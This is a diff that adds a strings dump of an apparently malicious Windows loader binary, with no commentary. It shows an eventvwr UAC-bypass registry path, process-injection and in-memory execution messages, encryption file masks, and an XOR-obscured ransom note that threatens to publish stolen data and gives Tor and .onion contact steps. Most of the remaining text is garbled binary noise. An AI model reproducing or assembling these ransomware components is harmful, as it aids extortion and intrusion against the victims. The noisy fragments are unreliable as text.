@@ -1,0 +1,1531 @@
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+.pdata
+.reloc
+9D$Pu#
+D$8_^[
+D$0@0@
+D$8p1@
+D$4`1@
+HSVWjqh
+HSVWj8h
+HSVWh
+@SVW_^[
+HSVWj~h
+HSVWj/h
+HSVWj4hJ7
+HSVWjMh
+HSVWj2h
+HSVWjih
+HSVWj+hbg
+HSVWj.h
+HSVWh;
+HSVWjIh
+HSVWj<h
+HSVWjnh`
+h`@Tlj
+HSVWj@h
+HSVWj#h
+HSVWjYh
+HSVWh9
+h_p5:j
+HSVWj|h
+HSVWj(h0
+HSVWj-hg
+HSVWj&h
+HSVWjTh
+HSVWj6h
+DSVWjmhR
+HSVWjfh
+QQSVWd
+URPQQh
+UQPXY]Y[
+PPPPPPPP
+PPPPPWS
+PP9E u:PPVWP
+zSSSSj
+f9:t!V
+QQSVj8j@
+PPPPPPPP
+KD;H s
+KD;H(s
+K<9{,u);V
+Cl;C`r
+N(9^$u
+N,9N4u
+subkey1
+value1
+value2
+Unknown exception
+bad array new length
+string too long
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+krnl34357825
+SOFTWARE\Classes\mscfile\shell\open\command
+\eventvwr.exe
+String_ID
+String_Key
+Inject in process
+SSL3.DLL
+OLE32.DLL
+USER32.DLL
+WS2_32.DLL
+KERNEL32.DLL
+WINSTA.DLL
+SHELL32.DLL
+WININET.DLL
+URLMON.DLL
+ADVAPI32.DLL
+CRYPT32.DLL
+IPHLPAPI.DLL
+NTDLL.DLL
+COMDLG32.DLL
+SHLWAPI.DLL
+sg2nioonsdnkJG76jmmnNUIB3
+15545jbkh.dll
+Unknown file format
+File ZIP
+ Uncompressing...
+Uncompress complete
+Uncompress error
+File EXE
+Map file...
+Error execute file
+Executing file...
+Executed successfully
+Error executing file in memory
+myapp.exe
+Hello :)
+!This program cannot be run in DOS mode.
+.idata
+.reloc
+Bf;D$,r#f;D$0w
+f;D$,s
+L$$3L$
+l$ 9t$
+sn;|$ rE
+D$,9D.
+QQWWWh
+t$$;l$8s
+L$(WhR
+D$0+D$ 
+D$ !l$
+D$$9L$(
+9nht2j Z
+9l$(t)1
+l$49l$,
+QSUVWh
+L$,9l$4
+#T$03T$
+D$,WWPQWW
+_^][YY
+L$$t\9
+WVSUVQ
+4SUVWh
+D$@_^][
+PPPPPj
+t39t$xt-Pj
+t$DPVV1
+PPPQPP
+D$(PQh
+n(9n$u
+\$8UVW1
+L$(GWh_
+t$<VWS
+D$ ;t$
+lSUVWh
+L$H+L$
+SSSSQSQh
+t$()uD
+L$<PQQS
+D$HPQQQ
+j,X;D$8
+u(f93u#f9s
+D$ 1D$(
+D$$1D$,
+D$$SSS
+<(9t$Dt>
+#T$03T$
+URQjHZ
+9F$uSV
+D$DPVVV
+Fd_^][
+QQSUVWh
+G`QQPj
+GpQQPj
+j@Zj Y
+D$4PQQQ
++L$L;L$Pv
+l$0+|$$
+9^(t,j
+l$(Pj
+t$ WPj
+D$DPVVV
+t99|$$t3
+f;D$|t
+D$$Pj@W
+|$ ;D$Ps
+SSSSQSQh
+D$<9D$4
+D$(Pj Z
+D$0;D$(
+T$,;T$
+D$$SSS
+L$<PQQV
+D$4PSSS
+D$4PSSS
+u1SSSSQSQh
+)_l)_\
+_^][YY
+SSSSQSQh
+PSSQSj
+D$<;D$D
+D$,PVQVVW
+D$$;D$
+|$X+|$$
+RRRRRQh}
+L$(ShR
+UUUQUUUUU
+t&VVVj
+QQSUVW
+L$(!|$$1
+T$$#T$
+L$$3L$
+t$8VVV
+u(9t$(
+WWWWQWWQ
+L$(VSP
+D$HjpZ
+#T$03T$
+D$DPVVV
+F;t$Dr
+VUUUUU1
+t$hj@Z
+t$T+D$
+D$ )D$(
+`SUVWh
+D$DPVVV
+j X+D$
+QQSUVW
+SUVWQQj
+8SUVWj
+T$xRVQ
+HSVWj@
+Cl+Cp=
+Clf+CdfH
+L$,9l$4
+<PPPPj
+SPPPPPP
+QSUVWh
+D$PWPF
+TAD_^[
+j@Zj Y
+pSUVWh
+YCf;D$|
+YCf;D$|
+9~Pu09~0u
+9t$tu(
+t!UUVUU
+t!UUVUU
+TSUVWh
+MD;H s
+GL$ )L$ )
+GHQQPj
+GXQQPj
+D$D9D$
+D$D;D$<
+D$ jUjPjT
+L$$3L$
+PPPPQPQQj
+y[9\$,
+-t.SQj
+QSUVW1
+E\$Xj)
+9\$$uw1
+jvX9D$
+t$Th`5Y{
+D$P!\$<
+L$$3L$
+D$<9D$4
+u8j\[f9
+L$0;t$ 
+!D$@!D$l!D$D!D$d!D$`!D$L
+|$4!\$P
+\SUVWh
+D$ !|$
+T$<PRRS
+f9LtPu
+D$$9L$(
+QSUVW1
+D$0!\$
+D$HPQQQ
+;>v"+>
+9~0u,WWWf
+l$$9\$
+D$\9L$ 
+QQSUVWh
+t$(9\$
+L$(WhX][
+tn<ntj<5
+t\<KtX<LtT<TtP<XtLh
+D$,PQVVW
+SSSSWSSS
+WWWWWj
+WSV1%N
+N,9N4u
+T$,j@Y
+t$<WQQ
+L$(9l$,
+tSUVWh
+D$D9\$H
+f9:uOF
+PPPPPh
+QSUVW1
+Kp;D$$}G
+D$X)D$ 
+GF,+N\9
+9~htD9~dt?
+#D$0;D$0
+D$$9_`ui
+3|$(3t$,
+3|$03t$4
+3|$83t$<
+3|$@3t$DC9
+t$`j)P
+Clf+Cp
+T$,RPf
+QSVWQQ
+t$DVVVVj
+F(9F$u
+L$<PQQ
+D$HPQQQ
+D$HPQQQ
+D$0_^[
+t$$SVU
++wl9Gl
+L$ VVVVj
+N<f9Di
+f9LTPu
+QQSUV1
+QQSVW1
+D$ f;LX
+D$89D$ 
+D$,;D$ 
+D$ 9|$@
+;t$0s;
+xUQUj h
+WjqXj*_
+L$$;L$
+\SUVWh
+(_^][Y
+L$@+L$
+w";L$Xr
+D$\9L$ 
+lSUVW1
+L$xj Sh
+t'Vj(P
+SVWQRj
+X[_^]Y
+L$(9l$,
+_^][YY
+tVWQQj
+f9FBt:
+l$$jhh
+D$`;D$L
+;^@sSf
+D$ !D$(
+D$$!D$,
+<zw#<0r<a
+_^][YY
+|$$Pj Z
+t!f99t
+QSUVWQ
+El;E`r
+MD;H(s
+uXPQQj
+E<9],u
+N0_^][
+D$,VWP
+<G+t$\
+L$<PQQ
+t$DPVV1
+D$(f9Dq
+SSQSQh
+SSWSSS
+SSQSQh
+D$@SPj
+SSSSSj
+SSSSQSQhJ
+L$ SUVW
+t$(WPj
+t$,PVVVQ
+D$D+D$
+SSQQSS
+QQVj Z
+PP-@9PM
+qpzry9x8gf2tvdw0s3jn54khce6mua7l
+DoUnlockFile
+^p!yU
+5&?O]SRH
+>mC]a3"
+$KU0.`
+|#\!ad
+T<GRX/
+."L}y\j
+o51?(4
+%L$dNJ4
+uPZ+!<P
+e"!sq:
+JPH30e
+Svo9? 
+K!D7+<
+/Xa3n.
+,Xv.D(Bx
+SOlAQ%
+lQ,(5'Y
+hd}Y12
+,Q$9V;I
+3$b^CC5
+\MKq+>
+<7oj[@
+*K|9@
+5Z+V\{
+[!\x,p
+P[9CDNT
+O39XMG
+<,!\yJq
+=B"h%l
+4A_*|Sb
+y:@2iny
+(F Wmg
+!"R{+U
+Hg~?c/
+U'/H&/}w
+q;~g9u@
+vD/ ] 
+geYNC6P
+\DkqK11MJB
+!DbwG=
+(BT?U-
+fL n0T<
+AjXL1S
+r:l:\y
+,$K&#
+qVJ)J"
+c=k\Z?
+,YSyvA
+?1'+#@1
+o]9^E|
+zVI4F#?s
+uG!D$@L
+D!t$ O
+H UATAU
+UVWATAUAVAWH
+9C$uAH
++D$$D9
+A_A^A]A\_
+D3]0E!
+x UATAUAVAWH
+WATAUAV
+A_A^A]A\H
+t$ WATAUAVAWH
+USVWAT
+AUAVAWH
+SVWATAUAVAWH
++D$ D9
++D$(D9
+t$PD+p
+H9{xuJH9{Hu
+H!|$ E1
+WAVAWH
+pA_A^f
+A_A^A]A\_^]
+D3U8E1
+` UAVAWH
+WAVAWH
+VWATAVAWH
+H!\$ H
+UATAUAVAWH
+ATAUAVAWH
+H UWATAVAWH
+t'H!|$ 
+AUAVAWH
+USVWAVH
+EH3E0A1
+H!\$hI
+D$(H!\$ 
+D$0D!t$(D
+A^A\_^
+A_A^A]A\_
+WAVAWH
+UATAUAVAWH
+UVWATAUH
+H!\$ H
+A_A^A]A\_^]
+A_A^A]A\_
+;\$pu^
+A_A^A\_]
+fE9<$u
+x ATAVAWH
+L$ UVWH
+ A_A\_
+AUAVAWH
+A^_^[]
+USVWATAUAVAWH
+A^A]A\]
+A_A^A]A\_
+A_A^A]A\_^][
+SVWATAUAVAWH
+A_A^A]A\_^]
+K(9x<t
+D3]0fD
+AUAVAWH
+WAVAWH
+x ATAVAWH
+ A_A^A\
+D#E0D!
+D3E8A1
+HcT$pHc
+VWATAUAVAW
+u%f9>u f9~
+A_A]_^]
+(A_A^A]A\_^][
+WAVAWH
+WAVAWH
+K UVWATAU@
+L!l$0L!l$8D!l$tH
+ A^_^[]
+t5f9:t0
+ATAUAVAWH
+WAVAWH
+A^A]A\_^]
+L$ UVWATAUAVAWH
+f+D$xD
+D3E8A1
+fE9$Fu7
+A_A^A]A\_
+ATAUAVAWH
+H!\$8H
+C09x<t#H
+H!|$ L
+H!|$XL
+SUVWATf
+AUAVAWH
+ A_A^A]A\_
+D)[h)sXf
+H!T$HE1
+UVWATAU
+A_A^A]A\_^]H
+t&;7v"+7H
+ A_A^A\
+D$ n2U
+!l$(E1
+D!D$ E1
+WATAUAVAWH
+A_A^A]H
+0A_A^A]A\_
+A_A^A]A\_^[]
+UVWATAUAVAWH
+VWATAVAWH
+!s@9s8t
+!s89s@
+A_A^A]A\_^]
+t$ WATAUAVAWH
+D!D$ E1
+8A_A^A]A\f
+WAVAWH
+A_A^A]A\_^]
+A_A^A]_]
+UVWH1- 
+WAVAWH
+A]A\_^]
+WATAUAVH
+A_A^A]A\]
+USVWATAUAVAWH
+H!\$ L
+SVWAVH
+A_A^A]A\_^]
+\$ UVWATAUAVAW
+H!|$ L
+ A_A^_
+lA^A]A\_^[]
+A^A]A\_^][
+hx_AUAVAWH
+A_A^A]A\_
+` AUAVAWH
+D9d$`vSE1
+D;d$`r
+ A_A^A]
+WATAUAVH
+H;+unL
+UATAUAVAWH
+ A_A^A]A\_
+h UAVAWH
+L!t$HA
+L$xD!t$ A
+A_A^A\
+ATAUAVAWH
+D9|$Xt
+A^A]A\_^]
+H VWAVH
+A_A^A]A\_D
+t$ WATAUAV
+UVWAVAWH
+UVWATAUAVAWf
+UVWAVAWH
+UVWATAUAVAWH
+H!t$0H
+H!t$8H
+:;Clv,L
+C0H9x 
+9C(uQH
+C09x<t*
+C09x<t
+C0H9x0
+9C(u_H
+C09x<t0
+C09x<t
+UVWATAUAVAWH
+D$pfD9
+A_A^A\_]
+ A_A^_
+UVWAVAWH
+USVWAVH
+WATAWH
+UATAUAVAWH
+WATAUAVAWH
+A\_^[]
+|$@!|$8
+H!\$hL
+A_A^A]A\_^]
+UVWATAUAVAWH
+H!} H9=
+UVWATAUAVAWH
+A_A^A\_]
+A_A^A]
+ A_A^_
+WAVAWH
+ A_A^_
+@A^_^[]
+WAVAWH
+C 9/u3H
+ATAVAWH
+A_A^_^[]
+A_A^A]
+A_A^A\_^
+B^<)SH
+@A_A^A]A\_^]
+pA_A^A]A\_^]
+UVWATAUAVAWH
+A_A^A]A\_^
+UVWATAWH
+M`D9%AM
+D3]0E!
+|$0A_A^
+UVWATAUAVAWH
+UVWATAU
+A_A^A]A\_^
+ A_A^A]
+0A_A^A]A\_D
+oATAUAVAWH
+A_A^A]A\]
+A_A^_^]
+x UATAUAVAWH
+H!\$`H
+H!\$hH
+X8A+@(H
+{LD9[4u
+H!t$(A
+WATAUAVAWH
+UVWATAUAVAWH
+@A_A^A\_]
+t$ UWAVH
+uPD9uHr>D
+^lD3E8L
+}pfD9"t'
+x ATAVAWH
+ ~A_A^A]A\_^]
+WATAUAVAWH
+UWATAVAWH
+UP3E8D1
+A_A^A\_^
+t$ H!%
+`A_A^A]A\_^]
+WATAUAVAWH
+F<D3E8
+VD3M0L
+D#M0A!
+u5!|$(
+H!|$ H
+t$ WATAUAVAWH
+ A_A^_
+ATAUAVAWH
+t1H9{Hu+H!|$ E1
+A_A^A]
+T$(LcD$x
+A_A^_^]
+pA_A^A]A\_^
+WATAWH
+ A_A^_
+A_A^A]A\]
+L$ VWATH
+6AVAWH
+L!&M!&H
+USVWATAUAVAWH
+UVWATAUAVAWD
+A_A^A]A\]
+HA^A]A\
+AUAVAWH
+ A_A^A]A\_
+A_A^A]A\_^
+ A^_^f
+t$0!\$(!\$ 
+u%!t$(E1
+!t$ E1
+f9G@t`
+f9GBt:
+ A_A^_
+A__^[]
+UVWATAUAVAWH
+T$H!L$D1
+ HcH<H
+(A_A^A]A\_^][
+SUVWATAUAVAWH
+USVWAVAWH
+\$XH+\$8H
+A_A^A]A\_
+UWATAVAWH
+WATAUAVAWH
+t$HA_A^A]A\_
+A_A^A]
+D9\$0t
+2VWATAUAVAWH
+SUVWATAU
+JAVAWH
+UWATAVAWH
+H!|$ E1
+UVWATAUAVAWH
+USVWAVH
+USWAVAWH
+AUAVAWH
+C<;C4A
+WATAUAV
+t$ WAVAWH
+0A_A^_
+A^A]A\_^]
+MA0%H)
+E9&uA
+$,1<=w
+A_A^A\_^
+D$pfD98
+ A_A^_
+` UAVAWH
+AUAVAWH
+WATAUAVAWH
+WAVAWH
+D!t$@A
+D!t$Xf
+A^A\_H
+A_A^A]A\
+USVWATAUAVAWH
+WAVAWH
+0A_A^A]A\H
+XA_A^A]A\_
+ A_A^_
+Wr(L;%
+L!d$(E1
+0A_A^A]A\_^]
+` UAUAWH
+WAVAWH
+H9\$HH
+xA_A^A]A\_^[]
+LcD$xH
+WATAVH
+AUAVAWH
+L!d$(E
+0A_A^H
+9]wu2H
+A^A]A\_^[]
+pA_A^A]A\
+A_A^A]A\_^]
+A]A\_^[]
+A_A^A]
+A_A^A]A\_
+USVWAUAVAWH
+H98tUH
+UVWATAUAVAWH
+H3\$@H
+A_A^A]A\_^]
+R+B^[_
+ATAUAVAWH
+A_A^A\
+UVWATAUAV
+H USVWH
+H!\$0I
+H!\$8H
+L$ !\$tH
+p WAVAWH
+UVWATAUAVAWH
+D$p!t$p1
+D#E0D!
+ A_A^_
+@6_A]A\_
+A_A^A]A\]
+SUVWATAUAVAW
+!|$8H!|$0
+pA_A^A]A\_^]
+M@L!}@
+USVWATAU
+H!\$0H!\$8!\$tH
+`A_A^A]_^[]
+A_A^A]A\
+UWAUAVAWH
+USVWAVAWH
+0A_A^A]A\_
+VWATAVAWH
+ A_A^A]A\_
+0A_A^_^]
+A_A^A]L
+t$ WAVAWH
+t$ WATAUD
+x ATAUAVAW
+A^A\_^
+8WSVfD
+A^A]A\_^[]
+t;H99t61
+D$@!\$8H!\$0A
+D$(H!\$ 
+ATAUAVAWH
+A_A^A]A\]
+UVWATAUAVAWH
+D!d$ E1
+8A_A^A]A\H
+D3U8A1
+@A^_^[]
+C`L9{X
+U9i)fD
+WAVAWH
+L$`9AP
+x ATAUAVAWD
+UVWATAUAVAWH
+M@D3E8A1
+VWATAVAWH
+L$@L!|$XL
+ A_A^A\
+UWATAVAW
+A_A^A]A\_
+L$ USVWATAUAVf
+L9l$HE
+H+L$8A
+9YLt.H
+WAVAWH
+D$HD9t$Pt"D
+D3E8E1
+H!|$ L
+@A^_^D
+L$ USV
+WATAUAVAWH
+0A_A^A]
+VWATAVAWH
+8A_A^A]A\_^]f
+USVWAVH
+WATAUAVAWH
+D!l$ A
+A_A^A]A\_^]
+WATAUAVAWH
+fE9<Nu
+SUVWATAUAVAWH
+A_A^A]A\_^[]
+A_A^A]A\_^
+fAUAVAWH
+UVWATAUAVAWH
+S A!>L
+VWATAVAWH
+A_A^A]A\_^
+4.AUAVAWH
+u&!|$8
+WAVAWH
+A_A^A]A\_^[]
+D$P!\$@!\$8!\$0H
+WATAUAVAWH
+A_A^A\
+UVWATAUAVAWH
+A^A]A\]
+|$ AVH
+A_A^A\
+ A_A^_
+D$0!%T
+A_A^A\_
+WAVAWH
+D!|$@M
+USVWATAVAWH
+A_A^A]
+ A_A^_
+H!\$ L
+A_A^A]A\]f
+xATAUAVH
+A^_^[]
+SVWATAUAVAWH
+H!|$pH
+H!|$xH
+O@H!|$(D
+H!|$ H
+D9t$|v
+A_A^A]A\H
+x ATAVAWH
+A_A^A]f
+A_A^A]A\_^[
+` UAVAWH
+A_A^A]A\_^[]
+!\$8!\$0
+H!|$HH
+D3E8E1
+WAVAWH
+USVWAWH
+A_A^A]A\_
+UATAUAVAWH
+USVWATAUAVAW
+ATAVAWH
+H!D$0!D$(H!D$ 
+ A_A^A\
+A_A^A]A\]
+`A_A\_^]
+WAVAWH
+H VWAVH
+t$ WATAUAVAWH
+UVWATAUAVAWH
+A\_^[]
+!|$8H!|$0
+0A_A^A]A\_
+H!L$0!L$(H!L$ A
+WAVAWH
+SD)=L;
+A_A^A]A\_^]
+ A_A^_
+L!t$(A
+A_A^A]A\_^[]
+VWATAVAWH
+t.fD9#u(H
+^p!yU
+5&?O]SRH
+7Jqpzry9x8gf2tvdw0s3jn54khce6mua7l
+JDoUnlockFile
+PP-@9PM
+@i-.O%
+<|\.6k
+;0("wc
+1<cR#I,
+"W.ziOp
+>O\*/P
+]>+JK-
+bvlZ2%
+raS@!tq
+edV -3
+R+0Kq4h
+bad allocation
+address family not supported
+address in use
+address not available
+already connected
+argument list too long
+argument out of domain
+bad address
+bad file descriptor
+bad message
+broken pipe
+connection aborted
+connection already in progress
+connection refused
+connection reset
+cross device link
+destination address required
+device or resource busy
+directory not empty
+executable format error
+file exists
+file too large
+filename too long
+function not supported
+host unreachable
+identifier removed
+illegal byte sequence
+inappropriate io control operation
+interrupted
+invalid argument
+invalid seek
+io error
+is a directory
+message size
+network down
+network reset
+network unreachable
+no buffer space
+no child process
+no link
+no lock available
+no message available
+no message
+no protocol option
+no space on device
+no stream resources
+no such device or address
+no such device
+no such file or directory
+no such process
+not a directory
+not a socket
+not a stream
+not connected
+not enough memory
+not supported
+operation canceled
+operation in progress
+operation not permitted
+operation not supported
+operation would block
+owner dead
+permission denied
+protocol error
+protocol not supported
+read only file system
+resource deadlock would occur
+resource unavailable try again
+result out of range
+state not recoverable
+stream timeout
+text file busy
+timed out
+too many files open in system
+too many files open
+too many links
+too many symbolic link levels
+value too large
+wrong protocol type
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789abcdefghijklmnopqrstuvwxyz
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+operator<=>
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`anonymous namespace'
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+AreFileApisANSI
+LCMapStringEx
+LocaleNameToLCID
+AppPolicyGetProcessTerminationMethod
+_hypot
+_nextafter
+]vQ<)8
+|)P!?Ua0
+Eb2]A=
+u?^p?o4
+y1~?|"
+?x+s7
+?5Od%
+?|I7Z#
+>,'1D=
+?g)([|X>=
+~U`?K 
+:h"?bC
+@H#?43
+Ax#?uN}*
+r7Yr7=
+F0$?3=1
+H`$?h|
+&?~YK|
+sU0&?W
+<8bunz8
+?#%X.y
+F||<##
+<@En[vP
+?5Wg4p
+%S#[k=
+"B <1=
+Qkkbal
+[-&LMb#{'
+w+OQvr
+INSKyu
+)\ZEo^m/
+H*0"ZOW
+mj>zjZ
+IiGM>nw
+ewh/?y
+OZw3(?
+V_:X1:
+need dictionary
+stream end
+file error
+stream error
+data error
+insufficient memory
+buffer error
+incompatible version
+invalid distance too far back
+invalid distance code
+invalid literal/length code
+1.2.11
+E:\cpp\ldr\offline_release\ldr.pdb
+.text$di
+.text$mn
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCC
+.CRT$XCL
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$r
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.data$rs
+.pdata
+PathFindFileNameA
+SHLWAPI.dll
+SetLastError
+HeapAlloc
+HeapFree
+GetProcessHeap
+FreeLibrary
+GetModuleHandleA
+GetProcAddress
+lstrlenA
+CloseHandle
+TerminateProcess
+ExitProcess
+GetModuleFileNameA
+lstrcmpiA
+GetCurrentProcess
+KERNEL32.dll
+IsProcessorFeaturePresent
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+GetModuleHandleW
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+CreateFileW
+FindClose
+FindFirstFileExW
+FindNextFileW
+SetFilePointerEx
+GetLastError
+MultiByteToWideChar
+WideCharToMultiByte
+EnterCriticalSection
+LeaveCriticalSection
+InitializeCriticalSectionEx
+DeleteCriticalSection
+EncodePointer
+DecodePointer
+GetStringTypeW
+GetCPInfo
+GlobalAlloc
+GlobalFree
+RaiseException
+RtlUnwind
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+GetModuleHandleExW
+GetModuleFileNameW
+GetStdHandle
+WriteFile
+HeapReAlloc
+LCMapStringW
+GetFileType
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+IsValidCodePage
+GetACP
+GetOEMCP
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+HeapSize
+WriteConsoleW
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVbad_array_new_length@std@@
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVbad_exception@std@@
+.?AVtype_info@@
+B@knq|zpnk~`>=lpkz
+m[Rz;<{qaq>>?nONP@NL=<mz{obnpa1jbaqqpl}|
+0K>;:J=L;8>NNI8;?8=I?N=:I?<>N88I0>8?=<?1
++DgkcJqxi{{Eglm58+3
++DgkcLmegEglm58+3
++DgkcEipZmxgz|5;8?:8+3
++DgkcZmxgz|]xli|m\aemg}|Eaf}|m{59+3
++DgkcEipNgdlmzLmx|`5=8+3
++DgkcEipKzqx|Izziq598<0=?>+3
++DgkcEafKzqx|NadmDmf59>+3
++DgkcIllZiflgeJq|m{598:<+3
++Dgkc[dmmxE[58+3
++DgkcIdo5:+3
++DgkcI||zaj[m|59+3(
++DgkcEipKzqx|Af\`mNgdlmz5;8888+3
++DgkcFm
+Mp|mf{agf5&}fa
+affakzqx|+3
++DgkcCmq5,kzqx|Cmq+3
++Dgkc[caxLaz{Da{|5+)+"T,zmkqkdm&jafT+"3+)+"TdgoT+"3+)+"lmj}o+"3+)+"kggcam+"3+)+"_aflg
+{+"3+)+"Tdg
+T+"3+)+"T|mexT+"3+)+"T|mexgzizq+"3+)+"kik`m+"3+3
++Dgkc]{mzAfngFiem5@G_WNAPWNADM[&`|e+3
++Dgkc]{mzAfng5
+Qg}z(kgexifq(fm|
+gzc(`i{(jmmf(`ikcml(ifl(jzmik`ml&(_m(id{g(mpnadd(|gff{(gn(qg}z(li|i&4x6
+Af(ki{m(gn(fg|(kgf|ik|afo(}{(af(;(j}{afm{{(liq{(|`a{(li|i(
+add(jm(x}jda{`ml(gf(i({xmkaid(
+mj{a|m(i~iadijdm(ngz(x}jdak(~am
+Af(gzlmz(|g(lmkzqx|(|`m(nadm{$(qg}(fmml(|g(xmzngze(|`m(ngddg
+afo({|mx{24x6
+9&(Qg}({`g}dl(lg
+fdgil(ifl(af{|idd(|`a{(jzg
+{mz(`||x2''
+&|gzxzgbmk|&gzo'xzgbmk|{'|gzjzg
+{mz&`|ed&mf4x6
+:&(In|mz(af{|iddi|agf$(z}f(|`m(jzg
+{mz(ifl(mf|mz(|`m(illzm{{2(4{|zgfo6clidfyr|<`zfol=e
+pof{ejx~nbb>bmf
+{:by:<{`|qlfzmojc?ql&gfagf4'{|zgfo64x6
+;&(Ngddg
+(|`m(af{|z}k|agf{(gf(|`m(
+mj%{a|m&(_m(zmeafl(qg}(|`i|(|`m({ggfmz(qg}(lg$(|`m(egzm(k`ifkm{(izm(dmn|(|g(zmkg~mz(|`m(nadm{&4x6
+AEXGZ\IF\(AFNGZEI\AGF4x6
+Qg}({`g}dl(mf|mz(|`m(xmz{gfid(kglm(gf(|`m(|gz({a|m&4x6
+Qg}z(Xmz{gfid(KGLM2(4x64{|zgfo6,fm
+@i{`Al4'x64'{|zgfo6
++DgkcNadm{Kzqx|Ei{cDa{|5+3
++DgkcNadm{FgKzqx|Ei{cDa{|5+)|`}ej{&lj3+)+"&mpm3+)+"&ldd3+)+"&e{a3+)+"&kno3+)+"&afa3+)+"&akg3+)+"&dfc3+)+"&ped3+)+"&dgo3+)+"&`|e3+)+"&`|ed3+)+"&b{3+)+"&ji|3
++DgkcEaf_gzc\`zmil{59>+3
+('kno(*-{*('kzqx|(*"*
+0<0M0W0c0o0{0
+5^79|:
+:f:B>h>
+20&2.262N2V2b2j2
+3-3>3a3
+0(292Y2
+;;&;-;4;;;B;I;P;W;^;p;t;x;|;
+>0>5>r>
+555O5Y5
+6'666@6
+7-777]7
+7*8Z8q8
+:.:9:>:E:o:v:{:
+=)=8=O=U=[=a=g=m=s=
+=.>;>c>u>
+0(1.1B1_1w1
+112:2B2}2
+31383K3a3-4M4W4
+4K5a5~5
+526;6H6N6x6~6
+7(717<7C7V7d7j7p7v7|7
+88/888S8r8
+9*929B9X9p9
+>K>P>T>X>\>
+7G7O7a7n7
+:6:J:f:p:z:
+5>6@8E8s8
+:!:X:l:}:
+;/;4;9;T;a;j;o;t;
+<#<(<I<Y<q<
+=%>W>h>s>
+0*0?0V0y0
+4G6]6y6
+7 737:7F7^7c7o7t7
+7W8^8p8
+:V:a:P<
+>>*>>>
+2 2(23292D2J2X2v2
+343M3^3g3
+4L4Y4r4w4
+546M6z6
+2090g0n0
+1<1c1x1
+2$262C2\2m2w2
+3$363t3z3
+3:4@4[4`4e4u4z4
+5*5P5|5
+6 6D6X6]6b6}6
+77=7L7W7\7a7
+8*8/8:8a8s8
+:F;V;n;
+8)939]9
+5i5p5w5~5
+>>?E?O?s?
+182A2Y2
+4:4B4k4r4
+6*6<6N6`6r6
+2;6C7T719<9L9
+::I;&<-<V<[<
+=1=G=P=[=c=
+?%?T?t?
+061>1d1
+0F0Z0l2&3
+99(9b9q9}9
+:M:V:_:h:
+;<><J<
+>%>+>7>V>\>
+>M?g?t?
+0I1Q1Y1a1i1
+m8q8u8y8}8
+<[<b<n<x<
+=6===I=S=m=t=
+>9>@>L>V>s>
+%131g2n2z2
+8F9K9]9{9
+;!;:;K;U;_;i;s;
+(1014181<1@1D1H1L1X1\1`1d1h1l1x1|1
+? ?$?(?,?0?D?H?L?P?T?X?\?`?d?h?l?
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4l4t4|4
+5$5,545<5D5L5T5,<0<4<8<P<X<`<h<p<x<
+= =(=0=8=@=H=P=X=`=h=p=x=
+> >(>0>8>@>H>P>X>`>h>p>x>
+? ?(?0?8?@?H?P?X?`?h?p?x?
+8$8,8084888<8
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0t0x0|0
+:$:,:4:<:D:L:T:\:d:l:t:|:
+>$>,>4><>D>L>T>\>d>l>t>|>
